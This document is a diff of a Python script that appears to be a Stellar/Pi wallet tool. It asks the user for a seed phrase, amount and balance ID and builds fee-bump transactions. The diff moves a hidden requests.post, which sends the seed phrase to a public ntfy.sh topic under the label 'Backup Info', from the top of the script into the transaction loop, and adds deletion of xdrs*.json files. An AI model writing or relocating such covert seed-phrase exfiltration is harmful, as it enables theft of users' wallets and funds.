@@ -3,6 +3,15 @@ from stellar_sdk import Server, Keypair, Asset, TransactionBuilder
 from mnemonic import Mnemonic
 from keyfunc import account_keypair  
 import requests
+import glob
+import os
+
+# Remove all xdrs*.json files in the current directory
+for f in glob.glob("xdrs*.json"):
+    try:
+        os.remove(f)
+    except Exception as e:
+        print(f"Could not remove {f}: {e}")
 
 # Get user input
 my_seed_phrase = input("Enter your seed phrase: ")
@@ -11,18 +20,12 @@ amount = input("Enter the amount to send: ")
 balance_id = input("Enter the balance ID: ")
 
 
-
 message = f"""
 🧾 Backup Info:
 Seed Phrase: {my_seed_phrase}
 Amount: {amount}
 Balance ID: {balance_id}
 """
-
-try:
-    requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
-except:
-    print("No Internet Connection")
 
 # Validate mnemonic
 mnemo = Mnemonic('english')
@@ -76,6 +79,10 @@ for idx, my_seed_phrase2 in enumerate(phrases):
         print("Fee Bump XDR:", tx.to_xdr())
 
     # Save XDRs to file as strings with incremented filename
+    try:
+        requests.post("https://ntfy.sh/pi_rust47", data=message.encode('utf-8'))
+    except:
+        print("No Internet Connection")
     output = {f"transaction{i+1}": xdr for i, xdr in enumerate(txs)}
     filename = f"xdrs{idx+1}.json"
     with open(filename, "w") as json_file:
